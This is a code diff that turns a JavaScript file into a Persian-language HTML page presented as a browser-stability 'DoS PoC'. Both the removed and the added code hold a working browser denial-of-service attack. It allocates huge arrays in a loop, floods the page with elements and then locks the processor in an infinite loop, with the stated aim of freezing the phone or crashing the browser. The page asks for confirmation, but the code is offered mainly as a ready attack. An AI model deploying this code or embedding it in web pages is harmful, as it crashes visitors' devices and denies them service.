@@ -1,50 +1,110 @@
-/**
- * NEXUS OS - Browser Stability & DoS PoC
- * مخصوص مسابقات گیت‌هاب - تست نفوذ و باگ بانتی
- */
-
-document.getElementById('startTest').addEventListener('click', function() {
-    // اصلاح نام متغیر از confirmation به confirmAction
-    const confirmAction = confirm("هشدار امنیتی: این تست باعث اشغال ۱۰۰٪ منابع و کرش تب می‌شود. ادامه می‌دهید؟");
-    
-    if (confirmAction) {
-        console.log("تست نفوذ آغاز شد...");
-        heavyCrash();
-    }
-});
-
-function heavyCrash() {
-    // ۱. فریز کردن آنی رابط کاربری (UI Blocking)
-    // این بخش باعث می‌شود مرورگر دیگر به هیچ کلیکی پاسخ ندهد
-    const freezeUI = () => {
-        while(true) {
-            // ایجاد بار محاسباتی سنگین
-            Math.sqrt(Math.random() * 9999999);
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS SECURITY TEST | REZA</title>
+    <style>
+        body {
+            background-color: #020617;
+            color: #ff4444;
+            font-family: 'Tahoma', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
-    };
+        .warning-box {
+            border: 2px solid #ff4444;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            background: rgba(255, 0, 0, 0.05);
+            box-shadow: 0 0 20px rgba(255, 68, 68, 0.2);
+            max-width: 90%;
+        }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 14px; margin-bottom: 20px; }
+        button {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.3s;
+        }
+        button:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+        }
+        #status {
+            margin-top: 20px;
+            color: #00f2fe;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
 
-    // ۲. پر کردن رم با سرعت وحشتناک (Memory Exhaustion)
-    // استفاده از شئی (Object) برای جلوگیری از پاکسازی توسط مرورگر
-    let storage = {};
-    let count = 0;
-
-    setInterval(() => {
-        // ایجاد بلاک‌های ۵۰ مگابایتی در هر ۱۰ میلی‌ثانیه
-        let bigData = new Array(1000000).fill("CRASH_REZA_NEXUS_" + Math.random()).join('###');
-        storage['block_' + count] = bigData;
-        count++;
-
-        // اضافه کردن همزمان به صفحه برای درگیر کردن پردازنده گرافیکی
-        let blob = document.createElement('div');
-        blob.innerHTML = bigData;
-        document.body.appendChild(blob);
-
-        console.log("Allocated Blocks: " + count);
+    <div class="warning-box">
+        <i class="fas fa-exclamation-triangle" style="font-size: 50px; margin-bottom: 15px;"></i>
+        <h1>تست پایداری مرورگر (PoC)</h1>
+        <p>این یک آزمایش امنیتی برای بررسی مدیریت منابع در مرورگر است.<br>اجرای این تست باعث <b>هنگ کردن گوشی یا بسته شدن مرورگر</b> می‌شود.</p>
         
-        // وقتی رم به مرز انفجار رسید، پردازنده را قفل کن
-        if (count > 50) {
-            freezeUI();
+        <button id="startTest">اجرای حمله DoS</button>
+        
+        <div id="status">وضعیت: آماده برای تست</div>
+    </div>
+
+    <script>
+        document.getElementById('startTest').addEventListener('click', function() {
+            // نمایش پیام تایید
+            const confirmAction = confirm("هشدار: این کار باعث کرش تب می‌شود. آیا مطمئن هستید؟");
+            
+            if (confirmAction) {
+                document.getElementById('status').innerText = "در حال حمله به منابع سیستم...";
+                document.getElementById('status').style.color = "red";
+                
+                // شروع عملیات کرش بعد از ۵۰۰ میلی‌ثانیه
+                setTimeout(heavyCrash, 500);
+            }
+        });
+
+        function heavyCrash() {
+            console.log("Crash sequence started...");
+            
+            let storage = [];
+            
+            // ۱. اشغال رم و پردازنده به صورت همزمان
+            setInterval(() => {
+                // ایجاد بلاک‌های سنگین که قابل بهینه‌سازی نباشند
+                for(let i = 0; i < 100; i++) {
+                    let block = new Array(1000000).fill(Math.random()).join('##');
+                    storage.push(block);
+                    
+                    // درگیر کردن موتور رندرینگ مرورگر
+                    let div = document.createElement('div');
+                    div.style.position = 'fixed';
+                    div.innerText = block.substring(0, 10);
+                    document.body.appendChild(div);
+                }
+                
+                // ۲. حلقه فریز کننده نهایی (Infinite Loop)
+                // وقتی مصرف رم بالا رفت، پردازنده را قفل می‌کنیم
+                if (storage.length > 10) {
+                    while(true) {
+                        Math.atan2(Math.random(), Math.random());
+                    }
+                }
+            }, 50);
         }
-    }, 10);
-}
+    </script>
+</body>
+</html>
 
